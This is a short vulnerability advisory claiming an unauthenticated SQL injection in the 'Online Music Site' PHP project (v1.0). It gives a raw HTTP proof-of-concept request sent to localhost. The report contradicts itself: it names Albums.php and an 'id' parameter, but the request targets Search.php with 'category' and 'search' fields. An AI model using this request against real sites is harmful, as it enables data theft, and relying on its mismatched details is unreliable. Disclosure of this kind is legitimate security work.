# Online Music Site In PHP  Frontend/Albums.php SQL injection

## NAME OF AFFECTED PRODUCT(S)

Online Music Site

## Vendor Homepage

https://code-projects.org/online-music-site-in-php-with-source-code/

## Vulnerable File

Frontend/Albums.php

## VERSION(S)

v1.0

## Vulnerability Type

SQL injection

## DESCRIPTION

The Online Music Site project has a SQL injection vulnerability in the FrontEnd/Albums.php file when the user is not logged in on the frontend. An attacker can exploit this vulnerability to obtain sensitive information

## Vulnerability details and POC

The search parameter id value is not subject to filtering restrictions

![image-20260105175149249](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Online-Music-Site/image-20260105175149249.1aph7gxnln.webp)

![image-20260105175356108](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Online-Music-Site/image-20260105175356108.3govt8pbcq.webp)

data packet：

POST /mis/Frontend/Search.php HTTP/1.1
Host: localhost
Content-Length: 24
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/mis/Frontend/Albums.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

category=SELECT&search=1

![image-20260105175519462](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Online-Music-Site/image-20260105175519462.1ovwyc5ygo.webp)
